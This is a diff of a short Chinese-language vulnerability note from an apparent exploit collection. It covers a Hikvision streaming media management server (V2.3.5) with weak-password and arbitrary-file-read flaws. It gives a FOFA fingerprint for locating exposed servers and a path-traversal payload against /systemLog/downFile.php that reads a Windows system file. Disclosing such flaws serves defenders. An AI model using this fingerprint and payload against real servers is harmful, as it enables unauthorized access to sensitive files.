@@ -13,11 +13,11 @@ source: "MrWQ/vulnerability-paper"
 
 杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞和任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。
 
-**0x02 影响版本**
+**0x02 影响版本**
 
-HIKVISION V2.3.5
+HIKVISION V2.3.5
 
-**0x03 漏洞利用**
+**0x03 漏洞利用**
 
 ```
 ## FOFA指纹
@@ -35,7 +35,7 @@ title="流媒体管理服务器"
 ![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsUfl9XCjHwVfyXFKQ842wujPvSyeBgkhicGll56Kul8rbIaXpZ568LwQ/640?wx_fmt=png)
 
 ```
-## Payload
+## Payload
 /systemLog/downFile.php?fileName=../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
